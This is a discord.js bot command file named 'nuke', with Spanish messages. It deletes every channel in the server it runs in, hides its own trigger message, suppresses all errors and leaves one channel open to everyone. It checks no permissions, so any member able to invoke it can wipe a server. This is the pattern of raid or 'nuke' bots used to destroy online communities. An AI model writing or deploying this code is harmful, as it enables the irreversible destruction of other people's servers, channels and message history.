const Discord = require('discord.js')
const { Client, MessageEmbed } = require('discord.js')



module.exports = {
    timeout: 60000,
  name: "nuke",
  alias: "limpiar",
  descritpion: '',
  uso:'',
  category: '',
  run: async (client, message, args) => {

    message.delete().catch(()=>{
        return;
    })
    message.author.send({content: '**Se ha comenzado la eliminación de canales, esto puede demorar un poco.**'}).catch(()=>{
        return;
      })
    message.guild.channels.cache.forEach(c => {
        c.delete().catch(e=>{
          return;
        })//asd
        })
       
          message.guild.channels.create('.').then(c => {
            c.permissionOverwrites.create(c.guild.roles.everyone, { READ_MESSAGE_HISTORY: true,VIEW_CHANNEL: true, SEND_MESSAGES: true }).catch(e=>{return})
          })
          

  }
}